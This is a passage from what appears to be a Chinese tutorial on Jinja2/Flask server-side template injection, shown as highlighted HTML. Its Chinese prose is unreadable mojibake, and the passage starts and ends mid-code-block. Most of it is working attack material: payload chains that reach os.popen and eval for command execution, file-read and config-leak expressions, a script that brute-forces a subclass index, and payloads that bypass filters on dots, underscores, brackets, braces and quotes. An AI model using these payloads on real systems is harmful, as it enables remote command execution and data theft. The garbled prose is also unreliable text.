&gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;<br><span class="hljs-number">9.</span>å½“configæ˜¯<span class="hljs-literal">None</span>æ—¶ï¼Œå°è¯•è¯»å–current_appçš„config<br>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br><br></code></pre></td></tr></table></figure><h1 id="å¸¸è§æ–¹æ³•"><a href="#å¸¸è§æ–¹æ³•" class="headerlink" title="å¸¸è§æ–¹æ³•"></a>å¸¸è§æ–¹æ³•</h1><p>è·å–é”®å€¼æˆ–ä¸‹æ ‡çš„æ–¹å¼</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>è·å–å±æ€§çš„æ–¹å¼</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;%%&#125;å¯ä»¥ç”¨æ¥å£°æ˜å˜é‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ã€‚<br>&#123;&#123;&#125;&#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º<br>&#123;##&#125;è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š<br>\##å¯ä»¥æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ<br></code></pre></td></tr></table></figure>{%set%}æ‹¼æ¥<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml">c.æ„é€ popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(po=a,pen=a)|<span class="hljs-name">join</span>%&#125;</span><br></code></pre></td></tr></table></figure><h1 id="1-ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥"><a href="#1-ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="1.ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥"></a>1.ä»€ä¹ˆæ˜¯SSTIæ¨¡æ¿æ³¨å…¥</h1><p>SSTIï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æ¨¡æ¿å¼•æ“+æ³¨å…¥, é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹æ¨¡æ¿å¼•æ“</p><p>æ¨¡æ¿åªæ˜¯ä¸€ç§æä¾›ç»™ç¨‹åºæ¥è§£æçš„ä¸€ç§è¯­æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰è¿™é¡¹å·¥ä½œçš„ä¸€ç§å®ç°æ‰‹æ®µï¼Œè€Œè¿™ç§æ‰‹æ®µä¸è®ºåœ¨å‰ç«¯è¿˜æ˜¯åç«¯éƒ½æœ‰åº”ç”¨ã€‚</p><p>é€šä¿—ç‚¹ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ä¹Ÿå°±æ˜¯htmlæ¡†æ¶</p><p>å¸¸è§çš„æ¨¡æ¿å¼•æ“ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">PHP:</span> Smarty, Twig, <span class="hljs-keyword">Blade</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">java: </span><span class="hljs-keyword">JSP, </span>FreeMarker, Velocity<br><span class="hljs-symbol">Python:</span> <span class="hljs-keyword">Jinja2, </span>django, tornado<br></code></pre></td></tr></table></figure><p>ç®€å•çš„ssti</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">  &lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="hljs-string">  &lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt;</span><br><span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="hljs-string">  &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span>% (name)<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>å½“æˆ‘ä»¬è¾“å…¥nameæ˜¯å¯æ§çš„,ä½¿ç”¨çš„æ˜¯%Sæ¥å®ç°åŠ¨æ€çš„å­—ç¬¦ä¸²æ§åˆ¶ï¼Œè€ŒFlaskä½¿ç”¨çš„æ˜¯jinja2æ¨¡æ¿ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥{{}}ï¼Œ`{{}}`åœ¨`Jinja2`ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼Œ`Jinja2`åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{{}}åŒ…è£¹çš„å†…å®¹è¿›è¡Œè§£æï¼Œå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚<h1 id="2-SSTIå‰ç½®çŸ¥è¯†"><a href="#2-SSTIå‰ç½®çŸ¥è¯†" class="headerlink" title="2.SSTIå‰ç½®çŸ¥è¯†"></a>2.SSTIå‰ç½®çŸ¥è¯†</h1><p>ä¸»è¦äº†è§£ä¸€ç‚¹Pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</p><p><code>__class__</code>ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;abcd&#x27;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>().__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__base__</code>ç”¨äºè·å–ç±»çš„åŸºç±»<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__base__<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br>//<span class="hljs-built_in">object</span>ä¸º<span class="hljs-built_in">str</span>çš„åŸºç±»<br></code></pre></td></tr></table></figure><p><code>__mro__</code>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºçš„å…ƒç»„ã€‚ï¼ˆå½“è°ƒç”¨_mro_[1]æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº_base_ï¼‰<br>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>__subclasses__()</code>å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»çš„å…ƒç»„<br>ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;,&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;...]<br></code></pre></td></tr></table></figure><p><code>__init__</code><br>é‡è½½å­ç±»ï¼Œè·å–å­ç±»åˆå§‹åŒ–çš„å±æ€§ã€‚</p><p><code>__globals__</code><br>å‡½æ•°ä¼šä»¥å­—å…¸çš„å½¢å¼è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡<br>å°±æ¯”å¦‚ï¼š<code>os._wrap_close.__init__.__globals__</code>ï¼Œå¯ä»¥è·å–åˆ°osä¸­çš„ä¸€äº›å‡½æ•°ï¼Œè¿›è¡Œæ–‡ä»¶è¯»å–</p><h1 id="3-SSTIè¯­å¥æ„é€ "><a href="#3-SSTIè¯­å¥æ„é€ " class="headerlink" title="3.SSTIè¯­å¥æ„é€ "></a>3.SSTIè¯­å¥æ„é€ </h1><p>ç¬¬ä¸€æ­¥ï¼Œæ‹¿åˆ°å½“å‰ç±»ï¼Œä¹Ÿå°±æ˜¯ç”¨__class__</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼Œæ‹¿åˆ°åŸºç±»ï¼Œè¿™é‡Œå¯ä»¥ç”¨__base__ï¼Œä¹Ÿå¯ä»¥ç”¨__mro__</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">æˆ–</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[1]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">æˆ–</span><br><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼Œæ‹¿åˆ°åŸºç±»çš„å­ç±»ï¼Œç”¨<code>__subclasses__()</code></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()&#125;&#125;<br>[&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, <br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„è¯ï¼Œå°±è¦æ‰¾å¯åˆ©ç”¨çš„ç±»ï¼Œå¯»æ‰¾é‚£äº›æœ‰å›æ˜¾çš„æˆ–è€…å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç±»<br>å¤§å¤šæ•°åˆ©ç”¨çš„æ˜¯<code>os._wrap_close</code>è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªç®€å•è„šæœ¬æ¥å¯»æ‰¾å®ƒå¯¹åº”çš„ä¸‹æ ‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?name=\</span><br><span class="hljs-string">        &#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>    res = requests.get(url=url, headers=headers)<br>    <span class="hljs-comment">#print(res.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os._wrap_close&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨<code>osã€‚_wrap_close</code>ï¼Œè¿™ä¸ªç±»ä¸­æœ‰<code>popen</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å»è°ƒç”¨å®ƒ<br>é¦–å…ˆ<br>å…ˆè°ƒç”¨å®ƒçš„__init__æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ç±»</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•ã€å±æ€§ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å°±å¯ä»¥å»è¿›è¡ŒRCEäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()[<span class="hljs-number">138</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå‰å®³çš„æ¨¡å—ï¼Œå°±æ˜¯<code>__builtins__</code>,å®ƒé‡Œé¢æœ‰<code>eval()</code>ç­‰å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä¹Ÿåˆ©ç”¨å®ƒæ¥è¿›è¡ŒRCE<br>å®ƒçš„payloadæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h1 id="4-SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#4-SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="4.SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>4.SSTIå¸¸è§çš„ç»•è¿‡æ–¹å¼</h1><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡  ."></a>ç»•è¿‡  .</h2><p>å½“.è¢«banæ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç»•è¿‡æ–¹å¼</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1ã€ç”¨[]ä»£æ›¿.</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2ã€ç”¨attr()è¿‡æ»¤å™¨ç»•è¿‡</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡ _"></a>ç»•è¿‡ _</h2><p>å½“<code>_</code>è¢«banæ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç»•è¿‡æ–¹å¼</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1ã€é€šè¿‡listè·å–å­—ç¬¦åˆ—è¡¨ï¼Œç„¶åç”¨popæ¥è·å–_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2ã€å¯ä»¥é€šè¿‡å­—ç¬¦ç¼–ç çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œä¸¾ä¸ª16è¿›åˆ¶ç¼–ç ä¾‹å­ å¯ä»¥ç¼–ç ç»•è¿‡ pythonè§£æå™¨æ”¯æŒ hex ï¼Œunicodeç¼–ç </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure>ä½¿ç”¨{%set%}æ„é€ ä¸‹åˆ’çº¿<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">sb</span> = dict(aaaaaaaaaaaaaaaaaa=<span class="hljs-keyword">a</span>) | <span class="hljs-keyword">join</span> | <span class="hljs-built_in">count</span> %&#125;<br>&#123;% <span class="hljs-keyword">set</span> <span class="hljs-keyword">pop</span>=dict(<span class="hljs-keyword">pop</span>=<span class="hljs-keyword">a</span>)|<span class="hljs-keyword">join</span>%&#125;<br>&#123;% <span class="hljs-keyword">set</span> xiahuaxian = (lipsum | <span class="hljs-built_in">string</span> | <span class="hljs-keyword">list</span>) | attr(<span class="hljs-keyword">pop</span>)(<span class="hljs-keyword">sb</span>) %&#125;<br><br>å°æ ‡æŒ‰ç…§å®é™…æƒ…å†µå†™<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡ []"></a>ç»•è¿‡ []</h2><p>ç»å¸¸æœ‰ä¸­æ‹¬å·è¢«bançš„æƒ…å†µå‡ºç°ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨<code>pop</code>æˆ–<code>__getitem__()</code>ä»£æ›¿ç´¢å¼•ä¸­çš„&#96;[]ï¼Œå®ƒçš„ä½œç”¨ç®€å•è¯´å°±æ˜¯å¯ä»¥æŠŠä¸­æ‹¬å·è½¬æ¢ä¸ºæ‹¬å·çš„å½¢å¼ï¼Œä¸¾ä¸ªä¾‹å­</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure>## ç»•è¿‡{{}}æœ‰æ—¶å€™ä¸ºäº†é˜²æ­¢SSTIï¼Œå¯èƒ½ç¨‹åºå‘˜ä¼šbanæ‰{{ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨jinja2çš„è¯­æ³•ï¼Œç”¨{%æ¥è¿›è¡ŒRCEï¼Œä¸¾ä¸ªä¾‹å­æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„payload<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„payload</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]. <span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">138</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å€ŸåŠ©forå¾ªç¯å’Œifè¯­å¥æ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&#123;%for i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%print i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡å•å¼•å·åŒå¼•å·-ä¼ å‚ç»•è¿‡"><a href="#ç»•è¿‡å•å¼•å·åŒå¼•å·-ä¼ å‚ç»•è¿‡" class="headerlink" title="ç»•è¿‡å•å¼•å·åŒå¼•å·   ä¼ å‚ç»•è¿‡"></a>ç»•è¿‡å•å¼•å·åŒå¼•å·   ä¼ å‚ç»•è¿‡</h2><p>è¿‡æ»¤äº†å•ã€åŒå¼•å·ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡</p><p>requestç»•è¿‡</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 